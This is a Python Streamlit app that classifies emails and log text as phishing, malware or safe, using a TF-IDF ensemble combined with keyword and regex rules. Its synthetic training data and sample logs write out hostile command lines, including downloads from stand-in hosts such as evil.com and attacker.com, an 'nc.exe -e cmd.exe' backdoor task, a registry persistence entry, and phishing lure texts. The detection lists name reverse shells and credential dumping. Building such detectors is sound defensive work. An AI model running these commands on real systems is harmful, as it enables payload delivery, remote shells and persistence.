import streamlit as st
import re
import numpy as np
from collections import Counter
import time

# ML Libraries
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier, VotingClassifier
from sklearn.naive_bayes import MultinomialNB
from sklearn.linear_model import LogisticRegression
import warnings
warnings.filterwarnings('ignore')

# CYBERSECURITY THREAT CLASSIFIER - XYZ COMPANY
# Hybrid ML + Rule-Based Cognitive Computing System
st.set_page_config(
    page_title="XYZ Company - AI Threat Classifier",
    page_icon="🛡️",
    layout="wide"
)

# SYNTHETIC TRAINING DATA GENERATOR
class ThreatDataGenerator:
    @staticmethod
    def generate_training_data():
        phishing_samples = [
            "Dear customer, your account has been suspended. Click here to verify your identity immediately.",
            "URGENT: Your password will expire in 24 hours. Update now to avoid losing access.",
            "Congratulations! You have won $1,000,000. Send your bank details to claim your prize.",
            "Your PayPal account has unusual activity. Confirm your credentials now.",
            "Dear valued user, verify your account within 24 hours or it will be terminated.",
            "ALERT: Unauthorized login attempt detected. Reset your password immediately.",
            "Your Netflix subscription expired. Update payment method: bit.ly/netflix-update",
            "IRS Notice: You owe back taxes. Pay immediately via gift card to avoid arrest.",
            "Your Apple ID was used to sign in. If this was not you, click here now.",
            "Bank of America Security Alert: Confirm your SSN to continue using your account.",
            "Dear user your account shows suspicious activity please verify immediately",
            "You have been selected for a cash prize click the link to claim your reward",
            "Your email storage is full upgrade now by clicking this link verify your identity",
            "Amazon account locked due to suspicious activity verify your payment method now",
            "Urgent notice from Microsoft your windows license expired activate immediately",
            "Your lottery ticket won click here within 24 hours to claim prize money",
            "Dear valued customer update your billing information to continue service",
            "Security alert unusual sign in activity confirm your account credentials",
            "Inheritance notification you have been named beneficiary send personal details",
            "Your credit card has been charged verify transaction by clicking link below",
            "Account verification required failure to comply will result in termination",
            "Congratulations winner you have been randomly selected claim your reward now",
            "Dear sir madam we are contacting you regarding your suspended account",
            "Your package could not be delivered click tracking link update address",
            "Bank security notice verify your account to prevent unauthorized access",
            "Final warning your account will be closed unless you take action now",
            "Prize notification you won a new iPhone claim by providing shipping details",
            "Dear customer confirm your identity by clicking the secure link below",
            "Urgent tax refund available claim your money by submitting bank details",
            "Your subscription payment failed update payment method to continue access",
        ]

        malware_samples = [
            "powershell -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOZXctT2JqZWN0",
            "cmd.exe /c wget http://malicious.com/payload.exe and chmod +x payload.exe",
            "Download invoice.exe to view your bill. Enable macros for best experience.",
            "rundll32.exe javascript mshtml RunHTMLApplication document.write shell",
            "New-Object Net.WebClient DownloadFile http://evil.com/mal.exe mal.exe",
            "reg add HKLM SOFTWARE Microsoft Windows CurrentVersion Run /v malware",
            "certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe",
            "schtasks /create /sc minute /mo 5 /tn backdoor /tr nc.exe -e cmd.exe",
            "wscript.exe //B //E:jscript C:/Users/Public/dropper.js",
            "mshta vbscript Execute CreateObject Wscript.Shell Run payload",
            "powershell bypass executionpolicy download file from remote server execute",
            "process injection shellcode buffer overflow exploit payload delivery",
            "disable windows defender modify registry keys persistence mechanism",
            "encoded base64 command decode execute malicious script payload",
            "netcat reverse shell connection attacker controlled server backdoor",
            "mimikatz credential dumping lsass memory extraction password hashes",
            "keylogger installation capture keystrokes exfiltrate sensitive data",
            "ransomware encryption file locker bitcoin payment decrypt files",
            "trojan dropper download additional malware components execute silently",
            "rootkit installation hide malicious processes kernel level access",
            "create scheduled task persistence reboot survival mechanism installed",
            "disable antivirus software modify security settings bypass protection",
            "command and control beacon callback communication encrypted channel",
            "lateral movement network propagation spread infection additional hosts",
            "data exfiltration upload stolen files remote server compression encryption",
            "privilege escalation exploit vulnerability gain administrator access",
            "process hollowing inject malicious code legitimate process masquerade",
            "dll sideloading hijacking search order load malicious library",
            "fileless malware memory resident attack powershell living off land",
            "obfuscated vbscript macro enabled document weaponized attachment",
        ]

        safe_samples = [
            "Hi team, please review the quarterly report and provide feedback by Friday.",
            "Meeting reminder: Project sync at 2 PM in Conference Room B tomorrow.",
            "The new software update has been deployed successfully to all systems.",
            "Please find attached the meeting minutes from yesterday's discussion.",
            "Thank you for your purchase. Your order #12345 has been shipped.",
            "Weekly newsletter: Check out our latest blog posts and company updates.",
            "Reminder: Complete your timesheet by end of day today.",
            "Happy birthday! The team wishes you a wonderful celebration.",
            "The server maintenance is scheduled for this weekend. Plan accordingly.",
            "Great job on the presentation! The client was very impressed.",
            "Hello everyone the project deadline has been extended by one week",
            "Please remember to submit your expense reports before month end",
            "Thank you for attending the training session feedback is appreciated",
            "The office will be closed next Monday for the holiday",
            "Congratulations to the team for achieving quarterly sales targets",
            "Please review the attached document and provide your comments",
            "The new employee orientation will be held next Tuesday morning",
            "Thank you for your patience while we resolved the technical issue",
            "Reminder to update your contact information in the HR system",
            "The company picnic is scheduled for next Saturday at the park",
            "Please join us for the monthly town hall meeting this afternoon",
            "Thank you for your feedback it helps us improve our services",
            "The new policy document has been uploaded to the shared drive",
            "Wishing you a speedy recovery hope to see you back soon",
            "Please complete the annual compliance training by end of month",
            "The team lunch is scheduled for Friday at noon everyone welcome",
            "Thank you for your continued dedication to excellence",
            "The quarterly review meeting has been rescheduled to next week",
            "Please remember to backup your important files regularly",
            "Welcome aboard we are excited to have you join our team",
        ]

        texts = phishing_samples + malware_samples + safe_samples
        labels = [0] * len(phishing_samples) + [1] * len(malware_samples) + [2] * len(safe_samples)

        return texts, labels

# MACHINE LEARNING MODEL
class MLThreatClassifier:
    def __init__(self):
        self.vectorizer = TfidfVectorizer(
            max_features=5000,
            ngram_range=(1, 3),
            min_df=1,
            max_df=0.95,
            sublinear_tf=True
        )

        self.classifiers = {
            'nb': MultinomialNB(alpha=0.1),
            'lr': LogisticRegression(max_iter=1000, C=1.0),
            'rf': RandomForestClassifier(n_estimators=100, max_depth=10, random_state=42)
        }

        self.ensemble = VotingClassifier(
            estimators=[(name, clf) for name, clf in self.classifiers.items()],
            voting='soft'
        )

        self.is_trained = False

    def train(self, texts, labels):
        X = self.vectorizer.fit_transform(texts)
        self.ensemble.fit(X, labels)
        self.is_trained = True
        return self

    def predict_proba(self, text):
        if not self.is_trained:
            return {'phishing': 0.33, 'malware': 0.33, 'safe': 0.34}

        X = self.vectorizer.transform([text])
        probs = self.ensemble.predict_proba(X)[0]

        return {
            'phishing': float(probs[0]),
            'malware': float(probs[1]),
            'safe': float(probs[2])
        }

    def predict(self, text):
        probs = self.predict_proba(text)
        predicted_class = max(probs, key=probs.get)
        confidence = probs[predicted_class]
        return predicted_class, confidence, probs

# RULE-BASED ENGINE
class RuleBasedClassifier:
    def __init__(self):
        self.phishing_patterns = {
            'high': [
                'verify your account', 'confirm your identity', 'account suspended',
                'click here immediately', 'password expired', 'unusual activity',
                'security alert', 'account locked', 'confirm within 24 hours',
                'winner', 'lottery', 'prize claim', 'inheritance', 'wire transfer',
                'gift card payment', 'dear valued customer', 'update payment',
                'billing information', 'ssn required', 'social security number'
            ],
            'medium': [
                'urgent', 'act now', 'limited time', 'expire', 'suspended',
                'unauthorized', 'verify now', 'confirm now', 'dear customer',
                'dear user', 'click here', 'login attempt', 'reset password'
            ],
            'low': [
                'account', 'verify', 'confirm', 'update', 'secure', 'bank',
                'paypal', 'amazon', 'microsoft', 'apple', 'netflix'
            ]
        }

        self.malware_patterns = {
            'critical': [
                'powershell -encoded', 'cmd /c', 'wget http', 'curl -o',
                'chmod +x', 'nc -e', 'reverse shell', 'keylogger', 'ransomware',
                'cryptolocker', 'mimikatz', 'reg add hklm', 'schtasks /create',
                'disable defender', 'bypass security', 'privilege escalation'
            ],
            'high': [
                '.exe download', 'enable macros', 'enable content', 'powershell',
                'base64 decode', 'eval(', 'document.write', 'wscript', 'mshta',
                'rundll32', 'certutil', 'payload', 'shellcode', 'exploit'
            ],
            'medium': [
                '.exe', '.dll', '.bat', '.vbs', '.js attachment', 'download now',
                'install', 'macro', 'script', 'encoded', 'obfuscated'
            ]
        }

        self.regex_patterns = {
            'base64_long': (r'[A-Za-z0-9+/]{50,}={0,2}', 15),
            'ip_address': (r'\b(?:\d{1,3}\.){3}\d{1,3}\b', 10),
            'url_shortener': (r'(?:bit\.ly|tinyurl|goo\.gl|t\.co|is\.gd)', 12),
            'hex_bytes': (r'(?:0x[a-fA-F0-9]{2}\s*){5,}', 15),
            'suspicious_extension': (r'\.(exe|dll|bat|cmd|vbs|ps1|scr)\b', 10),
            'encoded_command': (r'(?:encodedcommand|frombase64string)', 20),
        }

    def analyze(self, text):
        text_lower = text.lower()

        results = {
            'phishing_score': 0,
            'malware_score': 0,
            'indicators': [],
            'rule_matches': 0
        }

        for keyword in self.phishing_patterns['high']:
            if keyword in text_lower:
                results['phishing_score'] += 20
                results['indicators'].append(f"🎣 High-risk phishing: '{keyword}'")
                results['rule_matches'] += 1

        for keyword in self.phishing_patterns['medium']:
            if keyword in text_lower:
                results['phishing_score'] += 10
                results['indicators'].append(f"🎣 Medium-risk phishing: '{keyword}'")
                results['rule_matches'] += 1

        for keyword in self.phishing_patterns['low']:
            if keyword in text_lower:
                results['phishing_score'] += 3
                results['rule_matches'] += 1

        for keyword in self.malware_patterns['critical']:
            if keyword in text_lower:
                results['malware_score'] += 30
                results['indicators'].append(f"🦠 Critical malware: '{keyword}'")
                results['rule_matches'] += 1

        for keyword in self.malware_patterns['high']:
            if keyword in text_lower:
                results['malware_score'] += 20
                results['indicators'].append(f"🦠 High-risk malware: '{keyword}'")
                results['rule_matches'] += 1

        for keyword in self.malware_patterns['medium']:
            if keyword in text_lower:
                results['malware_score'] += 8
                results['rule_matches'] += 1

        for pattern_name, (pattern, score) in self.regex_patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                results['malware_score'] += score
                results['phishing_score'] += score // 2
                results['indicators'].append(f"⚠️ Pattern detected ({pattern_name}): {len(matches)} matches")
                results['rule_matches'] += 1

        urgency_words = ['immediately', 'urgent', 'asap', 'now', 'hurry', 'quickly', 'fast']
        urgency_count = sum(1 for word in urgency_words if word in text_lower)
        if urgency_count >= 2:
            results['phishing_score'] *= 1.3
            results['indicators'].append(f"⏰ High urgency language ({urgency_count} words)")

        results['phishing_score'] = min(results['phishing_score'], 100)
        results['malware_score'] = min(results['malware_score'], 100)

        return results

# HYBRID CLASSIFIER
class HybridThreatClassifier:
    def __init__(self, ml_weight=0.6, rule_weight=0.4):
        self.ml_classifier = MLThreatClassifier()
        self.rule_classifier = RuleBasedClassifier()
        self.ml_weight = ml_weight
        self.rule_weight = rule_weight
        self.is_trained = False

    def train(self):
        texts, labels = ThreatDataGenerator.generate_training_data()
        self.ml_classifier.train(texts, labels)
        self.is_trained = True
        return self

    def classify(self, text):
        if not text.strip():
            return {
                'classification': 'No Input',
                'confidence': 0,
                'ml_scores': {},
                'rule_scores': {},
                'indicators': [],
                'details': {},
                'threat_score': 0
            }

        ml_class, ml_confidence, ml_probs = self.ml_classifier.predict(text)
        rule_results = self.rule_classifier.analyze(text)

        rule_total = rule_results['phishing_score'] + rule_results['malware_score'] + 50
        rule_probs = {
            'phishing': rule_results['phishing_score'] / rule_total,
            'malware': rule_results['malware_score'] / rule_total,
            'safe': 50 / rule_total
        }

        combined_scores = {}
        for cls in ['phishing', 'malware', 'safe']:
            combined_scores[cls] = (
                self.ml_weight * ml_probs[cls] +
                self.rule_weight * rule_probs[cls]
            )

        total = sum(combined_scores.values())
        for cls in combined_scores:
            combined_scores[cls] /= total

        if rule_results['malware_score'] >= 50:
            combined_scores['malware'] += 0.2
        if rule_results['phishing_score'] >= 40:
            combined_scores['phishing'] += 0.15

        total = sum(combined_scores.values())
        for cls in combined_scores:
            combined_scores[cls] /= total

        final_class = max(combined_scores, key=combined_scores.get)
        final_confidence = combined_scores[final_class] * 100

        threat_score = max(
            combined_scores['phishing'] * 100,
            combined_scores['malware'] * 100
        )

        class_labels = {
            'malware': '🦠 MALWARE THREAT',
            'phishing': '🎣 PHISHING ATTEMPT',
            'safe': '✅ SAFE'
        }

        if final_class == 'safe' and final_confidence < 70:
            display_class = '⚠️ SUSPICIOUS'
        else:
            display_class = class_labels[final_class]

        return {
            'classification': display_class,
            'raw_class': final_class,
            'confidence': round(final_confidence, 1),
            'threat_score': round(threat_score, 1),
            'ml_scores': {k: round(v * 100, 1) for k, v in ml_probs.items()},
            'rule_scores': {
                'phishing': round(rule_results['phishing_score'], 1),
                'malware': round(rule_results['malware_score'], 1)
            },
            'combined_scores': {k: round(v * 100, 1) for k, v in combined_scores.items()},
            'indicators': rule_results['indicators'],
            'rule_matches': rule_results['rule_matches']
        }


# INITIALIZE MODEL
@st.cache_resource
def load_classifier():
    classifier = HybridThreatClassifier(ml_weight=0.6, rule_weight=0.4)
    classifier.train()
    return classifier

classifier = load_classifier()

# USER INTERFACE
st.markdown("""
    <div style='text-align: center; padding: 20px; background: linear-gradient(90deg, #1a1a2e 0%, #16213e 100%); border-radius: 10px; margin-bottom: 20px;'>
        <h1 style='color: #00d4ff;'>🛡️ XYZ Company Security Portal</h1>
        <h3 style='color: #888;'>Hybrid AI + Rule-Based Threat Classification System</h3>
        <p style='color: #666;'>Powered by Machine Learning & Cognitive Computing</p>
        <p style='font-size: 14px; margin-top: 10px;'>Created by <strong>Pranav Sarotra</strong></p>
    </div>
""", unsafe_allow_html=True)

with st.sidebar:
    st.markdown("### 🏢 XYZ Company")
    st.markdown("""
    **Departments Protected:**
    - 💻 IT Department
    - 🔐 Cybersecurity
    - 💰 Finance
    - 🛎️ Customer Service
    - 📢 Marketing
    """)

    st.markdown("---")

    st.markdown("### ⚙️ Model Configuration")
    ml_weight = st.slider("ML Model Weight", 0.0, 1.0, 0.6, 0.1)
    rule_weight = 1.0 - ml_weight
    st.caption(f"Rule-Based Weight: {rule_weight:.1f}")

    classifier.ml_weight = ml_weight
    classifier.rule_weight = rule_weight

    st.markdown("---")

    st.markdown("### 📊 Model Info")
    st.markdown("""
    **ML Components:**
    - TF-IDF Vectorizer
    - Naive Bayes
    - Logistic Regression
    - Random Forest

    **Ensemble:** Soft Voting
    """)

    st.markdown("---")

    st.markdown("### 🎯 Threat Categories")
    st.markdown("""
    - 🎣 **Phishing**: Social engineering
    - 🦠 **Malware**: Malicious code
    - ⚠️ **Suspicious**: Uncertain
    - ✅ **Safe**: No threats
    """)

col1, col2 = st.columns([2, 1])

with col1:
    st.markdown("### 📧 Enter Email or Log Entry for Analysis")

    sample_option = st.selectbox(
        "Quick Test Samples:",
        ["-- Select a sample --", "Phishing Email", "Malware Log", "Safe Email", "Subtle Phishing", "Obfuscated Malware"]
    )

    samples = {
        "Phishing Email": """Dear Valued Customer,

We have detected unusual activity on your account. Your password has expired and your account will be SUSPENDED within 24 hours unless you verify your identity immediately.

Click here to verify now: http://bit.ly/secure-verify-xyz

This is URGENT. Act now to prevent account termination.

Best regards,
Security Team""",

        "Malware Log": """[ALERT] Suspicious process detected
Process: powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAA=
Parent: cmd.exe /c wget http://192.168.1.100/payload.exe -O temp.exe
Action: Attempting to disable Windows Defender
Registry modification: reg add HKLM SOFTWARE Policies Microsoft Windows Defender
Scheduled task created for persistence via schtasks /create
Base64 encoded command detected in execution chain""",

        "Safe Email": """Hi Team,

Just a reminder about tomorrow's quarterly meeting at 2 PM in Conference Room B.

Please review the attached agenda (PDF) and come prepared with your department updates.

Looking forward to a productive session!

Thanks,
Sarah
Project Manager""",

        "Subtle Phishing": """Hello,

Your recent order #A3847 could not be processed due to a payment issue.

Please update your billing information to complete your purchase.

If you did not make this order, please verify your account immediately.

Thanks,
Customer Support""",

        "Obfuscated Malware": """System Log Entry:
Process spawned with encoded parameters
Command: FromBase64String followed by Invoke-Expression
New scheduled task created: schtasks /create /tn SystemUpdate
Network connection established to: 45.33.32.156:4444
Registry key modified for persistence mechanism
Windows Defender real-time protection disabled
Mimikatz detected in memory attempting credential dump"""
    }

    if sample_option != "-- Select a sample --":
        input_text = samples[sample_option]
    else:
        input_text = ""

    user_input = st.text_area(
        "Paste content here:",
        value=input_text,
        height=250,
        placeholder="Paste email content, system log, or any suspicious text..."
    )

with col2:
    st.markdown("### 📊 Input Statistics")
    st.metric("Characters", len(user_input))
    st.metric("Words", len(user_input.split()) if user_input else 0)
    st.metric("Lines", user_input.count('\n') + 1 if user_input else 0)

    st.markdown("### ⚖️ Current Weights")
    st.progress(ml_weight)
    st.caption(f"ML: {ml_weight:.0%} | Rules: {rule_weight:.0%}")

if st.button("🔍 ANALYZE THREAT", type="primary", use_container_width=True):
    if user_input.strip():
        with st.spinner("🤖 Running hybrid ML analysis..."):
            time.sleep(0.5)
            results = classifier.classify(user_input)

        st.markdown("---")
        st.markdown("## 📋 Analysis Results")

        res_col1, res_col2, res_col3 = st.columns(3)

        if "SAFE" in results['classification']:
            color = "#00ff88"
        elif "SUSPICIOUS" in results['classification']:
            color = "#ffaa00"
        else:
            color = "#ff4444"

        with res_col1:
            st.markdown(f"""
                <div style='padding: 20px; background: linear-gradient(135deg, #1a1a2e, #16213e);
                border-radius: 10px; text-align: center; border-left: 5px solid {color};'>
                    <h2 style='color: {color}; margin: 0;'>{results['classification']}</h2>
                    <p style='color: #888; margin: 10px 0 0 0;'>Final Classification</p>
                </div>
            """, unsafe_allow_html=True)

        with res_col2:
            st.markdown(f"""
                <div style='padding: 20px; background: linear-gradient(135deg, #1a1a2e, #16213e);
                border-radius: 10px; text-align: center;'>
                    <h2 style='color: #00d4ff; margin: 0;'>{results['confidence']}%</h2>
                    <p style='color: #888; margin: 10px 0 0 0;'>Classification Confidence</p>
                </div>
            """, unsafe_allow_html=True)

        with res_col3:
            if "SAFE" in results['classification']:
                threat_level = "NONE"
                level_color = "#00ff88"
            elif "SUSPICIOUS" in results['classification']:
                threat_level = "LOW"
                level_color = "#ffaa00"
            else:
                ts = results['threat_score']
                if ts > 70:
                    threat_level = "CRITICAL"
                    level_color = "#ff0000"
                elif ts > 50:
                    threat_level = "HIGH"
                    level_color = "#ff4444"
                elif ts > 30:
                    threat_level = "MEDIUM"
                    level_color = "#ff8800"
                else:
                    threat_level = "LOW"
                    level_color = "#ffaa00"

            st.markdown(f"""
                <div style='padding: 20px; background: linear-gradient(135deg, #1a1a2e, #16213e);
                border-radius: 10px; text-align: center;'>
                    <h2 style='color: {level_color}; margin: 0;'>{threat_level}</h2>
                    <p style='color: #888; margin: 10px 0 0 0;'>Threat Level</p>
                </div>
            """, unsafe_allow_html=True)

        st.markdown("---")

        st.markdown("### 🤖 ML vs 📏 Rule-Based Comparison")

        comp_col1, comp_col2 = st.columns(2)

        with comp_col1:
            st.markdown("#### Machine Learning Scores")
            for category, score in results['ml_scores'].items():
                emoji = "🎣" if category == "phishing" else "🦠" if category == "malware" else "✅"
                st.progress(score / 100)
                st.caption(f"{emoji} {category.title()}: {score}%")

        with comp_col2:
            st.markdown("#### Rule-Based Scores")
            st.progress(min(results['rule_scores']['phishing'] / 100, 1.0))
            st.caption(f"🎣 Phishing Risk: {results['rule_scores']['phishing']}%")
            st.progress(min(results['rule_scores']['malware'] / 100, 1.0))
            st.caption(f"🦠 Malware Risk: {results['rule_scores']['malware']}%")
            st.info(f"📋 Rule Matches: {results['rule_matches']}")

        st.markdown("### 📊 Combined Hybrid Scores")
        comb_col1, comb_col2, comb_col3 = st.columns(3)

        with comb_col1:
            st.metric("🎣 Phishing", f"{results['combined_scores']['phishing']}%")
        with comb_col2:
            st.metric("🦠 Malware", f"{results['combined_scores']['malware']}%")
        with comb_col3:
            st.metric("✅ Safe", f"{results['combined_scores']['safe']}%")

        st.markdown("### 🔎 Detected Indicators")
        if results['indicators']:
            for indicator in results['indicators']:
                if "Critical" in indicator or "High" in indicator:
                    st.error(indicator)
                elif "Medium" in indicator:
                    st.warning(indicator)
                else:
                    st.info(indicator)
        else:
            st.success("✅ No suspicious indicators detected by rule engine.")

        st.markdown("### 💡 Security Recommendations")

        if "MALWARE" in results['classification']:
            st.error("""
            **🚨 CRITICAL - Immediate Action Required:**
            1. **ISOLATE** the affected system immediately
            2. **DO NOT** execute any attached files or scripts
            3. Report to Cybersecurity Department: security@xyz.com
            4. Preserve logs for forensic analysis
            5. Check for lateral movement to other systems
            6. Update antivirus signatures and run full scan
            """)
        elif "PHISHING" in results['classification']:
            st.error("""
            **⚠️ HIGH RISK - Phishing Detected:**
            1. **DO NOT** click any links or download attachments
            2. **DO NOT** reply or provide any personal information
            3. Report to IT Security: phishing@xyz.com
            4. If credentials were entered, reset passwords immediately
            5. Enable MFA on all critical accounts
            6. Warn colleagues about this phishing campaign
            """)
        elif "SUSPICIOUS" in results['classification']:
            st.warning("""
            **🔍 Caution Advised:**
            1. Verify sender identity through official channels
            2. Do not click links - navigate to websites directly
            3. Forward to IT for secondary review
            4. When in doubt, delete the message
            """)
        else:
            st.success("""
            **✅ All Clear:**
            - No threats detected by hybrid analysis
            - Continue following security best practices
            - Report any suspicious behavior to IT
            """)

        with st.expander("🔧 Technical Details"):
            st.json({
                'model_weights': {'ml': ml_weight, 'rules': rule_weight},
                'ml_predictions': results['ml_scores'],
                'rule_scores': results['rule_scores'],
                'combined_scores': results['combined_scores'],
                'final_class': results['raw_class'],
                'confidence': results['confidence'],
                'threat_score': results['threat_score'],
                'indicators_count': len(results['indicators'])
            })
    else:
        st.warning("⚠️ Please enter text to analyze.")

st.markdown("---")
st.markdown("""
    <div style='text-align: center; color: #666;'>
        <p>XYZ Company Hybrid AI Security System v2.0</p>
        <p style='font-size: 12px;'>Combining Machine Learning with Expert Rules for Enhanced Threat Detection</p>
        <p style='font-size: 14px; margin-top: 10px;'>Created by <strong>Pranav Sarotra</strong></p>
        <p style='font-size: 12px;'>
            <a href='https://github.com/pranav-sarotra' target='_blank' style='color: #00d4ff; text-decoration: none;'>
                🔗 GitHub Profile
            </a>
        </p>
    </div>
""", unsafe_allow_html=True)
